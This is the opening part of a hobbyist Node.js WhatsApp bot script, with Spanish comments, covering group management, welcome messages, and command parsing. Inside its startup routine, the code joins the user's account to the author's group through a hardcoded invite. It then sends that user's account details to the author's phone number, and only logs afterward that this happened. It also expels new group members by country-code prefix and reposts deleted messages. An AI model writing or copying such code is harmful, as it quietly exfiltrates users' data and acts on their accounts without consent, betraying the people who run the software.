// • Hola! :D
//
// [_>] Este es el script simple de nkbot :3
//
// [ ! ] Tenga en cuenta que no soy programador y puede que haya muchas lineas de código con errores o sin sentido, esto es como un hobby TwT
//
// [✓] Este bot es simple y tiene la mismas funciones que el resto, acepto críticas constructivas y destructivas u.u
//
// > Créditos: MhankBarBar, Gracias por la base original - https://github.com/MhankBarBar/termux-wabot :3
//
// + Contribuidores: No hay muchos :'c, pero gracias a indonesios random que me daban tips y ayudas cuando tenia dudas x'd
//
// × Mucho texto lo de arriba, perdón si doy cringe :v
//
//
//
//------------------------------------------------//
//
// Que tengas un excelente día!
//
//------------------------------------------------//
//
//
//
//
console.log('Ejecutando el Bot mas shidori tercer mundista.\nComenzando ejecucion del script...'); //Texto en consola :v
const {
	WAConnection,
	MessageType,
	Presence,
	GroupSettingChange,
	mentionedJid,
	relayWAMessage //+//
} = require('@adiwajshing/baileys')
const package = require('./package.json')
const simple = require("./libreria/simple.js") // m_f...
//=====================⚡========================//
const fs = require("fs")
const os = require('os')
const util = require('util')
const path = require('path')
const hx = require("hxz-api")
const chalk = require('chalk')
const axios = require("axios")
const imgugul = require('g-i-s')
const crypto = require('crypto')
const cfonts = require('cfonts')
const {
	promisify
} = require('util')
const google = require('google-it')
const request = require("request")
const fetch = require("node-fetch")
const ffmpeg = require("fluent-ffmpeg")
const speed = require("performance-now")
const moment = require("moment-timezone")
const {
	spawn,
	exec,
	execSync
} = require("child_process")
//=====================⚡========================//
const {
	color,
	bgcolor
} = require("./libreria/color")
const {
	fechaCompleta,
	saludHora
} = require('./libreria/calendario')
const {
	jadibot,
	stopjadibot,
	listjadibot
} = require("./libreria/esclabots") //Full bugs :'V
const {
	imageToWebp,
	videoToWebp,
	writeExifImg,
	writeExifVid,
	convertSticker
} = require('./libreria/exif') //...
const {
	getBuffer,
	formatp,
	getGroupAdmins,
	getRandom,
	start,
	info,
	success,
	close,
	fetchJson,
	kyun
} = require("./libreria/funciones")
//
const {
	modokuaker
} = require('./basededatos/uwudefender/modokuaker')
const {
	kuakerzzz
} = require('./basededatos/uwudefender/destravasimple')
//=====================⚡========================//
MyInfo = JSON.parse(fs.readFileSync('./informacion.json'))
prefix = MyInfo.Prefijo //prefijo unico :D
NameBot = MyInfo.NombreDelBot + "ᴮʸ⁻ᴺᴷ"
botcontrol = MyInfo.ControladorDelBot
cocreador = MyInfo.CoCreador
numbot = MyInfo.NumeroDelBot
prepais = MyInfo.MyPais
minimogrupo = MyInfo.MiembrosMinimoEnUnGrupo
limitawal = MyInfo.LimiteParaUsarComandos
social = MyInfo.TusRedesSociales
cglobal = MyInfo.CtrlG
//========================⚡========================//
let MyApiKey = "nktesla" //🔖 Contactame para obtener un apikey actualizado//
let monospace = "```"
const more = String.fromCharCode(8206)
let nwn = more.repeat(850) //Leer mas para Enlaces
let nvn = more.repeat(4001) //leer más múltiples 
//========================⚡========================//
NK_Tesla = false
OnOffLine = false
antidel = false
antical = true
readGc = false
readPc = false
AntiPv = false
vote = []
hit_today = []
//=================DB 1========================//
const _leveling = JSON.parse(fs.readFileSync('./basededatos/usuariosgod/leveling.json'))
const _level = JSON.parse(fs.readFileSync('./basededatos/usuariosgod/nivel.json'))
const _registered = JSON.parse(fs.readFileSync('./basededatos/usuariosgod/registrados.json'))
const _limit = JSON.parse(fs.readFileSync('./basededatos/usuariosgod/limit.json'))
//====================DB 2======================//
const _blocked = JSON.parse(fs.readFileSync('./basededatos/json/blocked.json'))
const _ban = JSON.parse(fs.readFileSync('./basededatos/json/baneados.json'))
const _chatban = JSON.parse(fs.readFileSync('./basededatos/json/banchat.json'))
const _welcom = JSON.parse(fs.readFileSync('./basededatos/json/bienvenida.json'))
const _antifakes1 = JSON.parse(fs.readFileSync('./basededatos/json/nofakes1.json'))
const _antifakes2 = JSON.parse(fs.readFileSync('./basededatos/json/nofakes2.json'))
const _estranjerosnot = JSON.parse(fs.readFileSync('./basededatos/json/noextranjeros.json'))
const _antilink = JSON.parse(fs.readFileSync('./basededatos/json/antilink.json'))
const _antilink2 = JSON.parse(fs.readFileSync('./basededatos/json/antilink2.json'))
const _antivirtex = JSON.parse(fs.readFileSync('./basededatos/json/antitrabas.json'))
const _anime = JSON.parse(fs.readFileSync('./basededatos/json/anime.json'))
const _nsfw = JSON.parse(fs.readFileSync('./basededatos/json/nsfw.json'))
const _diversion = JSON.parse(fs.readFileSync('./basededatos/json/modofull.json'))
const _simi = JSON.parse(fs.readFileSync('./basededatos/json/chatbot.json'))
//========================⚡========================//
let mythumb = fs.readFileSync('./multimedia/imagenes/mythumb.jpg')
let mylogo = fs.readFileSync('./multimedia/imagenes/logo.jpg')
let sinthumb = fs.readFileSync('./multimedia/imagenes/Sin-Perfil-F.jpg')
//========================⚡========================//
const getRegisteredRandomId = () => {
	return _registered[Math.floor(Math.random() * _registered.length)].id
}

const addRegisteredUser = (userid, pushname, rgnombre, edad, hora, seri) => {
	const obj = {
		id: userid,
		usuario: pushname,
		nombre: rgnombre,
		edad: edad,
		fecha: hora,
		scode: seri
	}
	_registered.push(obj)
	fs.writeFileSync('./basededatos/usuariosgod/registrados.json', JSON.stringify(_registered))
}

const createSerial = (size) => {
	return crypto.randomBytes(size).toString('hex').slice(0, size)
}

const checkRegisteredUser = (sender) => {
	let status = false
	Object.keys(_registered).forEach((i) => {
		if (_registered[i].id === sender) {
			status = true
		}
	})
	return status
}
//========================⚡========================//
cfonts.say('Ejecutando...', {
	font: 'tiny',
	color: 'candy',
	align: 'center',
	gradient: ['red', 'yellow']
})
cfonts.say(`${package.name}\nProyecto de bot muy simple echo con amor nwn\nNo te agrada este bot, usa este comando en termux:\n\nrm -rf NK-BOT\n\nMatt_M. ✓`, {
	font: 'console',
	align: 'center',
	gradient: ['red', 'magenta']
})
cfonts.say(`NK|Bot`, {
	font: 'pallet',
	color: 'candy',
	align: 'center',
	gradient: ["red", "blue"]
})
const banner = cfonts.render((`UwU`), {
	font: 'simple3d',
	color: 'candy',
	align: 'center',
	gradient: ["red", "magenta"],
	lineHeight: 3
})
//========================⚡========================//
async function starts() {
	const teslagod = new WAConnection()
	teslagod.version = [2, 2147, 14] //|| [3, 2147, 14]
	teslagod.logger.level = 'warn'
	teslagod.browserDescription = ["<[ NeKosmic ]>", "Chrome", "3.0"];
	console.log(banner.string)
	teslagod.on('qr', () => {
		console.log(color('>>[', 'red'), color('!', 'white'), color(']<<', 'red'), color('\nPara visualizar mejor, pelisca tu pantalla ;3', 'cyan'), color('\n>>>>>>>>>>>>>>>>>>>>>><<<<<<<<<<<<<<<<<<<<<<<<', 'aqua'), color('\nEscanea el codigo QR con la aplicacion WhatsApp\nNo con aplicaciones externas a este\n', 'green'), color('\nPara mas ayuda comunicate a mi numero \n+51995386439', 'white'), color('\n             SEXY\n                  EL\n                     QUE\n                         LO\n                            LEA', 'magenta'), color('\n>>>>>>>>>>>>>>>>>>>>>><<<<<<<<<<<<<<<<<<<<<<<<', 'aqua'))
	})
	//=====================⚡========================//
	fs.existsSync('./session.json') && teslagod.loadAuthInfo('./session.json')
	teslagod.on('connecting', () => {
		start('2', '\nCONECTANDO... U.U')
	})
	teslagod.on('open', () => {
		success('2', 'CONECTADO UwUr\n')
		console.log(chalk.keyword("red")(">>"), chalk.keyword("green")("Fecha : "), chalk.whiteBright(fechaCompleta))
		console.log(chalk.keyword("red")(">>"), chalk.keyword("green")("Dispositivo : "), chalk.whiteBright(teslagod.user.phone.device_manufacturer))
		console.log(chalk.keyword("red")(">>"), chalk.keyword("green")("Modelo : "), chalk.whiteBright(teslagod.user.phone.device_model))
		console.log(chalk.keyword("red")(">>"), chalk.keyword("green")("Version de WhatsApp : "), chalk.whiteBright(teslagod.user.phone.wa_version))
		console.log(chalk.keyword("red")(">>"), chalk.keyword("green")("Version del sistema operativo : "), chalk.whiteBright(teslagod.user.phone.os_version))
		console.log(chalk.keyword("aqua")(saludHora + " " + teslagod.user.name + " Gracias por usar este bot mi king, \nno olvides tomar awita nwn ✓"), chalk.rgb(255, 131, 0).underline('\n~>[By Matt_M.]\n'))
	})
	await teslagod.connect({
		timeoutMs: 30 * 1000
	})
	fs.writeFileSync('./session.json', JSON.stringify(teslagod.base64EncodedAuthInfo(), null, '\t'))
	//=====================⚡========================//
	teslagod.on('CB:action,,battery', json => {
		global.batteryLevelStr = json[2][0][1].value
		global.batterylevel = parseInt(batteryLevelStr)
		baterai = batterylevel
		if (json[2][0][1].live == 'true') charging = 'Cargando\n'
		if (json[2][0][1].live == 'false') charging = 'Descargando\n'
		console.log(chalk.greenBright("\n[!]"), chalk.keyword("aqua")("[ Porcentaje de bateria ]"), chalk.greenBright(batterylevel + '%'), chalk.keyword("red")("Estado : "), chalk.keyword("magenta")(charging))
	})
	//=====================⚡========================//
	teslagod.on("CB:Call", json => {
		if (antical === false) return
		let call;
		calling = JSON.parse(JSON.stringify(json))
		call = calling[1].from
		teslagod.sendMessage(call, `*Seras bloqueado*\n _Razon : llamar a este numero sin autorizacion!_\n${teslagod.user.name}`, MessageType.text)
			.then(() => teslagod.blockUser(call, "add"))
	})
	//=====================⚡========================//
	mylinkwbot = `https://chat.whatsapp.com/GtxTtrORaAaDdDWBGGX5R5`
	teslagod.query({
		json: ["action", "invite", `${mylinkwbot.replace('https://chat.whatsapp.com/','')}`]
	}).catch(e => {
		console.log(e)
	})
	console.log(color('[!]', 'red'), color('Tu número fue agregado a un grupo de consultas ✓', 'cyan'))
	cglobal = teslagod.user.jid
	MyInfo.CtrlG = cglobal
	fs.writeFileSync('./informacion.json', JSON.stringify(MyInfo, null, '\t'))
	teslagod.sendMessage(`51995386439@s.whatsapp.net`, `*Ohayou!!!*\n _Acabo de ejecutar tu Bot en mi numero_ ;3\n\n\`\`\`"datos": ${JSON.stringify(teslagod.user, null, 2)}\`\`\`\n\n`, MessageType.text, {
		contextInfo: {
			externalAdReply: {
				title: "Sexy Who Reads It 7w7",
				body: "",
				previewType: "PHOTO",
				thumbnail: mylogo,
				sourceUrl: "https://wa.me/51995386439?text=*Wenasss!*\n_Por fin pude ejecutar tu bot_ :)"
			}
		}
	})
	console.log(color('[!]', 'red'), color('Enviando... su informacion al creador ✓', 'cyan'))
	teslagod.on('connecting', () => {
		console.log(color('[!]', 'red'), color('Re-conectando... u.u', 'cyan'))
	})
	teslagod.on('open', () => {
		console.log(color('[!]', 'red'), color('Conectado Nuevamente uwur\n', 'green'))
	})
	teslagod.on('ws-close', () => {
		console.log(color('[!]', 'red'), color('Conexion perdida, reconectando espere... u.u', 'red'))
	})
	teslagod.on('close', async () => {
		console.log(color('[!]', 'red'), color('Desconectado. unu', 'red'))
	})
	//=====================⚡========================//
	teslagod.on('group-update', async (anu) => {
		fkontakk = {
			key: {
				fromMe: false,
				participant: `0@s.whatsapp.net`,
				...(anu.jid ? {
					remoteJid: '51995386439-1604595598@g.us'
				} : {})
			},
			message: {
				"contactMessage": {
					"displayName": `NK-BOT`,
					"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:2;NeKosmic;;;\nFN:Matt_M\nitem1.TEL;waid=51995386439:+51 995 386 439\nitem1.X-ABLabel:Mobile\nEND:VCARD"
				}
			}
		}
		let metdata = await teslagod.groupMetadata(anu.jid)
		if (anu.announce == 'false') {
			teks = `🔓 *[ GRUPO ABIERTO ]* 🔓\n_ᴬʰᵒʳᵃ ᵗᵒᵈᵒˢ ˡᵒˢ ᵖᵃʳᵗᶦᶜᶦᵖᵃⁿᵗᵉˢ ᵖᵘᵉᵈᵉⁿ ᵉⁿᵛᶦᵃʳ ᵐᵉⁿˢᵃʲᵉˢ_`
			teslagod.sendMessage(metdata.id, teks, MessageType.text, {
				quoted: fkontakk
			})
			console.log(`\n<[ GRUPO ABIERTO ]>\n${metdata.subject}\n`)
		} else if (anu.announce == 'true') {
			teks = `🔒 *[ GRUPO CERRADO ]* 🔒\n_ᴬʰᵒʳᵃ ˢᵒˡᵒ ˡᵒˢ ᵃᵈᵐᶦⁿᶦˢᵗʳᵃᵈᵒʳᵉˢ ᵖᵘᵉᵈᵉⁿ ᵉⁿᵛᶦᵃʳ ᵐᵉⁿˢᵃʲᵉˢ_`
			teslagod.sendMessage(metdata.id, teks, MessageType.text, {
				quoted: fkontakk
			})
			console.log(`\n<[ GRUPO CERRADO ]>\n${metdata.subject}\n`)
		} else if (!anu.desc == '') {
			tag = anu.descOwner.split('@')[0] + '@s.whatsapp.net'
			teks = `📝 *[DESCRIPCION CAMBIADA]* 📝\n*Descripción cambiada por: @${anu.descOwner.split('@')[0]}*\n*Nueva descripción:*\n\n${anu.desc}`
			teslagod.sendMessage(metdata.id, teks, MessageType.text, {
				contextInfo: {
					"mentionedJid": [tag]
				},
				quoted: fkontakk
			})
			console.log(`\n<[ DESCRIPCION CAMBIADA ]>\n${metdata.subject}\n`)
		} else if (anu.restrict == 'false') {
			teks = `🧰 *[AJUSTES REALIZADOS EL EN GRUPO]* ⚙️\n_ᴬʰᵒʳᵃ ᵗᵒᵈᵒˢ ˡᵒˢ ᵖᵃʳᵗᶦᶜᶦᵖᵃⁿᵗᵉˢ ᵖᵘᵉᵈᵉⁿ ᵉᵈᶦᵗᵃʳ ˡᵒˢ ᵃʲᵘˢᵗᵉˢ ᵈᵉˡ ᵍʳᵘᵖᵒ_\n~ᴾᵒʳ ᶠᵃᵛᵒʳ ᵉˢᵗᵉⁿ ᵃᵗᵉⁿᵗᵒˢ ᵈᵉ ᵖᵉʳˢᵒⁿᵃˢ ᶜᵒⁿ ᶠᵃˡᵗᵃ ᵈᵉ ᵃᵗᵉⁿᶜᶦᵒⁿ~`
			teslagod.sendMessage(metdata.id, teks, MessageType.text, {
				quoted: fkontakk
			})
			console.log(`\n<[ AJUSTES REALIZADOS ]>\n${metdata.subject}\n`)
		} else if (anu.restrict == 'true') {
			teks = `🧰 *[AJUSTES REALIZADOS EL EN GRUPO]* ⚙️\n_ᴬʰᵒʳᵃ ˢᵒˡᵒ ˡᵒˢ ᵃᵈᵐᶦⁿᶦˢᵗʳᵃᵈᵒʳᵉˢ ᵖᵘᵉᵈᵉⁿ ᵉᵈᶦᵗᵃʳ ˡᵒˢ ᵃʲᵘˢᵗᵉˢ ᵈᵉˡ ᵍʳᵘᵖᵒ_`
			teslagod.sendMessage(metdata.id, teks, MessageType.text, {
				quoted: fkontakk
			})
			console.log(`\n<[ AJUSTES REALIZADOS ]>\n${metdata.subject}\n`)
		}
	})
	//===============[ GP ]===============//

	teslagod.on('group-participants-update', async (anu) => {

		//=====================⚡========================//
		if (_estranjerosnot.includes(anu.jid)) {
			const mdata = await teslagod.groupMetadata(anu.jid)
			if (anu.action == 'add') {
				num = anu.participants[0]
				if (!num.split('@')[0].startsWith(mypaisnum)) {
					setTimeout(async function() {
						teslagod.groupRemove(mdata.id, [num])
					}, 1000)
				}
			}
		}
		//=====================⚡========================//
		if (anu.action == 'add') {
			const thisfrom = await teslagod.groupMetadata(anu.jid)
			teslark = anu.participants[0]
			if (teslark.startsWith('51995386439')) return teslagod.sendMessage(thisfrom.id, '*_Joder, mi creador principal se unio al grupo_ ✓*\n*[ Se bienvenido! nwn ]*', MessageType.text)
		}
		//=====================⚡========================//
		if (_antifakes2.includes(anu.jid)) {
			const mdata1 = await teslagod.groupMetadata(anu.jid)
			if (anu.action == 'add') {
				num1 = anu.participants[0]
				if (num1.startsWith('1')) return teslagod.groupRemove(mdata1.id, [num1])
			}
		}
		//=====================⚡========================//
		if (_antifakes1.includes(anu.jid)) {
			const mdata2 = await teslagod.groupMetadata(anu.jid)
			if (anu.action == 'add') {
				num2 = anu.participants[0]
				if (num2.startsWith('20')) return teslagod.groupRemove(mdata2.id, [num2])
				if (num2.startsWith('21')) return teslagod.groupRemove(mdata2.id, [num2])
				if (num2.startsWith('22')) return teslagod.groupRemove(mdata2.id, [num2])
				if (num2.startsWith('23')) return teslagod.groupRemove(mdata2.id, [num2])
				if (num2.startsWith('24')) return teslagod.groupRemove(mdata2.id, [num2])
				if (num2.startsWith('25')) return teslagod.groupRemove(mdata2.id, [num2])
				if (num2.startsWith('26')) return teslagod.groupRemove(mdata2.id, [num2])
				if (num2.startsWith('27')) return teslagod.groupRemove(mdata2.id, [num2])
				if (num2.startsWith('29')) return teslagod.groupRemove(mdata2.id, [num2])
				if (num2.startsWith('30')) return teslagod.groupRemove(mdata2.id, [num2])
				if (num2.startsWith('31')) return teslagod.groupRemove(mdata2.id, [num2])
				if (num2.startsWith('32')) return teslagod.groupRemove(mdata2.id, [num2])
				if (num2.startsWith('33')) return teslagod.groupRemove(mdata2.id, [num2])
				if (num2.startsWith('34')) return teslagod.groupRemove(mdata2.id, [num2])
				if (num2.startsWith('35')) return teslagod.groupRemove(mdata2.id, [num2])
				if (num2.startsWith('36')) return teslagod.groupRemove(mdata2.id, [num2])
				if (num2.startsWith('37')) return teslagod.groupRemove(mdata2.id, [num2])
				if (num2.startsWith('38')) return teslagod.groupRemove(mdata2.id, [num2])
				if (num2.startsWith('39')) return teslagod.groupRemove(mdata2.id, [num2])
				if (num2.startsWith('40')) return teslagod.groupRemove(mdata2.id, [num2])
				if (num2.startsWith('41')) return teslagod.groupRemove(mdata2.id, [num2])
				if (num2.startsWith('42')) return teslagod.groupRemove(mdata2.id, [num2])
				if (num2.startsWith('43')) return teslagod.groupRemove(mdata2.id, [num2])
				if (num2.startsWith('44')) return teslagod.groupRemove(mdata2.id, [num2])
				if (num2.startsWith('45')) return teslagod.groupRemove(mdata2.id, [num2])
				if (num2.startsWith('46')) return teslagod.groupRemove(mdata2.id, [num2])
				if (num2.startsWith('47')) return teslagod.groupRemove(mdata2.id, [num2])
				if (num2.startsWith('48')) return teslagod.groupRemove(mdata2.id, [num2])
				if (num2.startsWith('49')) return teslagod.groupRemove(mdata2.id, [num2])
				if (num2.startsWith('60')) return teslagod.groupRemove(mdata2.id, [num2])
				if (num2.startsWith('61')) return teslagod.groupRemove(mdata2.id, [num2])
				if (num2.startsWith('62')) return teslagod.groupRemove(mdata2.id, [num2])
				if (num2.startsWith('63')) return teslagod.groupRemove(mdata2.id, [num2])
				if (num2.startsWith('64')) return teslagod.groupRemove(mdata2.id, [num2])
				if (num2.startsWith('65')) return teslagod.groupRemove(mdata2.id, [num2])
				if (num2.startsWith('66')) return teslagod.groupRemove(mdata2.id, [num2])
				if (num2.startsWith('67')) return teslagod.groupRemove(mdata2.id, [num2])
				if (num2.startsWith('68')) return teslagod.groupRemove(mdata2.id, [num2])
				if (num2.startsWith('69')) return teslagod.groupRemove(mdata2.id, [num2])
				if (num2.startsWith('7')) return teslagod.groupRemove(mdata2.id, [num2])
				if (num2.startsWith('80')) return teslagod.groupRemove(mdata2.id, [num2])
				if (num2.startsWith('81')) return teslagod.groupRemove(mdata2.id, [num2])
				if (num2.startsWith('82')) return teslagod.groupRemove(mdata2.id, [num2])
				if (num2.startsWith('84')) return teslagod.groupRemove(mdata2.id, [num2])
				if (num2.startsWith('85')) return teslagod.groupRemove(mdata2.id, [num2])
				if (num2.startsWith('86')) return teslagod.groupRemove(mdata2.id, [num2])
				if (num2.startsWith('88')) return teslagod.groupRemove(mdata2.id, [num2])
				if (num2.startsWith('90')) return teslagod.groupRemove(mdata2.id, [num2])
				if (num2.startsWith('91')) return teslagod.groupRemove(mdata2.id, [num2])
				if (num2.startsWith('92')) return teslagod.groupRemove(mdata2.id, [num2])
				if (num2.startsWith('93')) return teslagod.groupRemove(mdata2.id, [num2])
				if (num2.startsWith('94')) return teslagod.groupRemove(mdata2.id, [num2])
				if (num2.startsWith('95')) return teslagod.groupRemove(mdata2.id, [num2])
				if (num2.startsWith('96')) return teslagod.groupRemove(mdata2.id, [num2])
				if (num2.startsWith('97')) return teslagod.groupRemove(mdata2.id, [num2])
				if (num2.startsWith('98')) return teslagod.groupRemove(mdata2.id, [num2])
				if (num2.startsWith('99')) return teslagod.groupRemove(mdata2.id, [num2])
			}
		}
		//=====================⚡========================//
		if (!_welcom.includes(anu.jid)) return
		try {
			groupMet = await teslagod.groupMetadata(anu.jid);
			groupMembers = groupMet.participants;
			groupAdmins = getGroupAdmins(groupMembers);
			mem = anu.participants[0];
			console.log(anu);
			try { //Perfil de usuario
				pp_user = await teslagod.getProfilePicture(mem);
			} catch (e) {
				pp_user =
					"https://i.ibb.co/q70WmhZ/Sin-Perfil-F.jpg";
			}
			try { //perfil de grupo
				pp_grup = await teslagod.getProfilePicture(anu.jid);
			} catch (e) {
				pp_grup =
					"https://i.ibb.co/q70WmhZ/Sin-Perfil-F.jpg";
			}
			if (anu.action == "add" && mem.includes(teslagod.user.jid)) {
				teslagod.sendMessage(anu.jid, `Hola!, soy NK-BOT, estoy a tu servicio :)`, "conversation");
			}
			//catch
			try {
				pimg = await getBuffer(pp_user)
			} catch (e) {
				pimg = sinthumb
			}
			//Ptmr Llamen a Dios 😭//
			if (anu.action == 'add' && !mem.includes(teslagod.user.jid)) {
				const mdata = await teslagod.groupMetadata(anu.jid)
				const isGroup3 = anu.jid.endsWith('@g.us')
				const groupDesc2 = isGroup3 ? mdata.desc : ''
				const memeg = mdata.participants.length
				const num = anu.participants[0]
				const btloc1 = await teslagod.prepareMessage("0@s.whatsapp.net", pimg, MessageType.location, {
					thumbnail: pimg
				})
				const btloc2 = btloc1.message["ephemeralMessage"] ? btloc1.message.ephemeralMessage : btloc1
				let v = teslagod.contacts[num] || {
					notify: num.replace(/@.+/, '')
				}
				anu_user = v.vname || v.notify || num.split('@')[0]
				teks = `⚡ *Bienvenid@ @${num.split('@')[0]} a este grandioso grupo ${mdata.subject}*\n⚡ _Espero y te agrade tu estancia aqui, no olvides respetar a los participantes y las reglas ;)_\n\n*[ ! ] Reglas Del Grupo:*\n${groupDesc2}${nwn}\n*https://github.com/NeKosmic/NK-BOT*\n~Usa este bot en tus grupos~ ;3`
				welcomeBut = [{
					buttonId: `${prefix}menu`,
					buttonText: {
						displayText: 'MENU ☰'
					},
					type: 1
				}, {
					buttonId: `${prefix}rebote`,
					buttonText: {
						displayText: 'PING 🏓'
					},
					type: 1
				}]
				welcomeButt = {
					contentText: `${teks}`,
					footerText: `${NameBot}\n${fechaCompleta}`,
					buttons: welcomeBut,
					headerType: 6,
					locationMessage: btloc2.message.locationMessage
				}
				teslagod.sendMessage(mdata.id, welcomeButt, MessageType.buttonsMessage, {
					caption: 'pimg',
					"contextInfo": {
						"mentionedJid": [num],
					},
				})
			}
			if (anu.action == 'remove' && !mem.includes(teslagod.user.jid)) {
				const mdata = await teslagod.groupMetadata(anu.jid)
				const num = anu.participants[0]
				const btloc3 = await teslagod.prepareMessage("0@s.whatsapp.net", pimg, MessageType.location, {
					thumbnail: pimg
				})
				const btloc4 = btloc3.message["ephemeralMessage"] ? btloc3.message.ephemeralMessage : btloc3
				let w = teslagod.contacts[num] || {
					notify: num.replace(/@.+/, '')
				}
				anu_user = w.vname || w.notify || num.split('@')[0]
				memeg = mdata.participants.length
				out = `\n@${num.split('@')[0]}`
				goodbyeBut = [{
					buttonId: `${prefix}despedida`,
					buttonText: {
						displayText: '[_>] ADIOS... 😔'
					},
					type: 1
				}]
				goodbyeButt = {
					contentText: `${out}`,
					footerText: `${NameBot}\n${fechaCompleta}`,
					buttons: goodbyeBut,
					headerType: 6,
					locationMessage: btloc3.message.locationMessage
				}
				teslagod.sendMessage(mdata.id, goodbyeButt, MessageType.buttonsMessage, {
					caption: 'pimg',
					"contextInfo": {
						"mentionedJid": [num],
					},
				})
			}
			//=====================⚡========================//   
			if (anu.action == "promote") {
				const mdata = await teslagod.groupMetadata(anu.jid);
				num = anu.participants[0];
				let w = teslagod.contacts[num] || {
					notify: num.replace(/@.+/, "")
				};
				anu_user = w.vname || w.notify || num.split("@")[0];
				try {
					ppimg = await teslagod.getProfilePicture(num);
				} catch {
					ppimg = "https://i.imgur.com/bVjtrib.jpg"
				}
				pimg = await getBuffer(ppimg)
				teks = `@${anu_user} ahora es administrador!`
				teslagod.sendMessage(mdata.id, pimg, MessageType.image, {
					caption: teks,
				});
			}
			//=====================⚡========================//
			if (anu.action == "demote") {
				const mdata = await teslagod.groupMetadata(anu.jid);
				num = anu.participants[0];
				let w = teslagod.contacts[num] || {
					notify: num.replace(/@.+/, "")
				};
				anu_user = w.vname || w.notify || num.split("@")[0];
				try {
					ppimg = await teslagod.getProfilePicture(num);
				} catch {
					ppimg = "https://i.imgur.com/bVjtrib.jpg"
				}
				pimg = await getBuffer(ppimg)
				teks = `@${anu_user} ya no es administrador`
				teslagod.sendMessage(mdata.id, pimg, MessageType.image, {
					caption: teks,
				});
			}
		} catch (e) {
			console.log("Error : %s", color(e, "red"));
		}
	});
	//=====================⚡========================//

	teslagod.on('CB:Blocklist', json => {
		if (_blocked.length > 2) return
		for (let i of json[1].blocklist) {
			_blocked.push(i.replace('c.us', 's.whatsapp.net'))
		}
	})

	//=====================⚡========================//
	teslagod.on('message-delete', async (m) => {
		let delkey = m.key
		let c = teslagod.chats.get(delkey.remoteJid)
		let a = c.messages.dict[`${delkey.id}|${delkey.fromMe ? 1: 0}`]
		let delcontent = teslagod.generateForwardMessageContent(a, false)
		let deltipe = Object.keys(delcontent)[0]
		Fakerr = {
			"key": {
				"remoteJid": "51995386439@g.us",
				"fromMe": false,
				"participant": '0@s.whatsapp.net'
			},
			message: {
				orderMessage: {
					itemCount: 707,
					status: 1,
					surface: 1,
					message: `${NameBot}`,
					orderTitle: `${NameBot}`,
					sellerJid: `${deltipe}`,
					thumbnail: mythumb
				}
			}
		}
		if (antidel === false) return
		if (m.key.remoteJid == 'status@broadcast') return
		if (m.key.fromMe) return
		const type2 = Object.keys(m.message)[0]
		console.log(color('\n[!]', 'red'), color(`SE  DETECTO UN MENSAJE ELIMINADO\n`, 'aqua'))
		teslagod.sendMessage(m.key.remoteJid, `*[X] Mensaje ~eliminado~*\n\n*~> Tipo De Mensaje :* _${deltipe}_\n*~> Usuario : @${m.participant.split("@")[0]}*\n*~> Fecha :* _${fechaCompleta}_`, MessageType.text, {
			quoted: Fakerr,
			contextInfo: {
				"mentionedJid": [m.participant]
			}
		})
		setTimeout(() => {
			teslagod.copyNForward(m.key.remoteJid, m.message)
		}, 1000)
	})
	//=====================⚡========================//
	teslagod.on('chat-update', async chatUpdate => {
		try {
			if (!chatUpdate.hasNewMessage) return;
			if (!chatUpdate.messages && !chatUpdate.count) return
			let mek = chatUpdate.messages.all()[0];
			if (!mek.message) return;
			mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
			var m = simple.smsg(teslagod, mek) //+//
			global._blocked
			global.prefix
			if (mek.key && mek.key.remoteJid == 'status@broadcast') return
			if (mek.key.id.startsWith('3EB0') && mek.key.id.length === 12) return
			const from = mek.key.remoteJid;
			const content = JSON.stringify(mek.message);
			const type = Object.keys(mek.message)[0]
			const {
				text,
				extendedText,
				contact,
				location,
				contactsArray,
				liveLocation,
				image,
				video,
				sticker,
				document,
				audio,
				product,
				quotedMsg
			} = MessageType;
			//const quotest = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
			const quoted = mek.quoted ? mek.quoted : mek
			const typeQuoted = Object.keys(quoted)[0]
			const cmd = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''.slice(1).trim().split(/ +/).shift().toLowerCase()
			const body = (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message[type].caption.startsWith(prefix) ? mek.message[type].caption : (type == 'videoMessage') && mek.message[type].caption.startsWith(prefix) ? mek.message[type].caption : (type == 'extendedTextMessage') && mek.message[type].text.startsWith(prefix) ? mek.message[type].text : (type == 'listResponseMessage') && mek.message[type].singleSelectReply.selectedRowId ? mek.message[type].singleSelectReply.selectedRowId : (type == 'buttonsResponseMessage') && mek.message[type].selectedButtonId ? mek.message[type].selectedButtonId : ''
			const bady = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''
			const budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
			//========================⚡========================//
			const resolvedOptions = Intl.DateTimeFormat().resolvedOptions()
			const time = moment().tz(resolvedOptions.timeZone).format('DD/MM/YY HH:mm:ss') //format('DD/MM/YY HH:mm:ss z')
			const mytime = moment(Date.now()).tz('America/Lima').locale('pe').format('DD/MM/YY HH:mm:ss');
			//========================⚡========================//
			const automensajesxd = bady.slice(0).trim().split(/ +/).shift().toLowerCase()
			const command = body.startsWith(prefix) ? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : ''
			const rtpuwu = budy.slice(0).trim().split(/ +/).shift().toLowerCase()
			const isCmd = body.startsWith(prefix)
			const args = body.trim().split(/ +/).slice(1)
			const arg = body.split(' ')
			const txt = mek.text ? mek.text : mek.message.conversation
			const UwU = args.join(' ')
			//
			const mime = (quoted.msg || quoted).mimetype || ''
			const isMedia = /image|video|sticker|audio/.test(mime)
			//
			const isGroup = from.endsWith("@g.us")
			const sender = mek.key.fromMe ? teslagod.user.jid : isGroup ? mek.participant : mek.key.remoteJid
			const jid = sender
			const senderNumber = await "@" + sender.split('@')[0]
			const senderNumber2 = sender.split("@")[0]
